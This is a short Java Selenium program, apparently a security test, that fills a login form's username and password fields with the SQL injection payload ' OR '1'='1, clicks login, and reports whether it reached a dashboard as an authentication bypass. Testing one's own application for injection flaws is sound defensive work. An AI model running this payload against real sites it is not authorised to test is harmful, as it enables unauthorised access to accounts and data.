import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;

public class SQLInjectionTest {

    public static void main(String[] args) {
        // Set the path to the chromedriver executable
        System.setProperty("webdriver.chrome.driver", "path/to/chromedriver");

        // Initialize the ChromeDriver
        WebDriver driver = new ChromeDriver();

        try {
            // Open the web application login page
            driver.get("http://example.com/login"); // Change this to your web application's URL

            // Find the username and password fields
            WebElement usernameField = driver.findElement(By.name("username"));
            WebElement passwordField = driver.findElement(By.name("password"));

            // Set the username and password with SQL injection payload
            String sqlInjectionPayload = "' OR '1'='1";
            usernameField.sendKeys(sqlInjectionPayload);
            passwordField.sendKeys(sqlInjectionPayload);

            // Find and click the login button
            WebElement loginButton = driver.findElement(By.name("login"));
            loginButton.click();

            // Check the result of the login attempt
            // You might want to add assertions or print out some result here
            // For example:
            if (driver.getCurrentUrl().contains("dashboard")) {
                System.out.println("SQL Injection Successful, logged in as admin");
            } else {
                System.out.println("SQL Injection failed");
            }
        } finally {
            // Close the browser
            driver.quit();
        }
    }
}
